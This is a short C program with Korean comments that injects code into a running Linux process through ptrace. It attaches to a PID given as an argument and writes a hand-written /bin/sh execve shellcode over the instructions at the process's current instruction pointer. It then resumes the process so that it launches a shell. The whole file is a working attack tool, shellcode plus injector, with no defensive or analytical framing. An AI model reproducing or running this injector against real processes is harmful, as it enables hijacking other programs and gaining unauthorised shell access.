#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/user.h>

//인젝션으로 넣을 코드
//예전에 만들었던 /bin/sh 셸코드 
void MyCode()
{
	__asm__ __volatile__(
	// /bin/sh문자열을 스택에 저장
	"push $0x0068732F \n\t"
	"push $0x6E69622F \n\t"
	//문자열 주소 백업
	"mov %esp, %ebx \n\t"
	//sh의 메인함수 인자 배열 
	"xor %eax, %eax \n\t"
	"push %eax \n\t"
	"push %ebx \n\t"
	//sh의 메인함수 인자 배열 주소 백업
	"mov %esp, %ecx \n\t"
	//execve 함수 인자 NULL설정
	"mov $0, %edx \n\t" 
	//시스템 콜 번호 설정
	"mov $0xb, %eax \n\t" 
	//시스템 콜
	"int $0x80 \n\t"	
	);
}

int main(int argc, char * argv[])
{
	int pid, data_read;
	struct user_regs_struct regs = {0,};
	int size = (int)main - (int)MyCode;

	if(argc != 2)
	{
		printf("usage : %s pid\n", argv[0]);
		return 0;
	}
	
	pid = atoi(argv[1]);

	//attach
	if(ptrace(PTRACE_ATTACH, pid, 0, 0) == -1)
	{
		printf("ptrace attach fail\n");
		return 0;
	}

	//대상 프로세스가 attach되고 멈추길 기다림
	wait();

	//레지스터 값 얻기
	ptrace(PTRACE_GETREGS, pid, 0, &regs);
	printf("original eip : %p\n", regs.eip);

	//기존 코드영역에 내 코드 인젝션
	for(int i =0; i<size; i+=4)
		ptrace(PTRACE_POKEDATA, pid, regs.eip+i, *(int*)(MyCode+i));
	
	//대상 프로세스 이어서 진행하도록 함
	ptrace(PTRACE_CONT, pid, 0, 0);

	//detach
	ptrace(PTRACE_DETACH, pid, 0, 0);
}




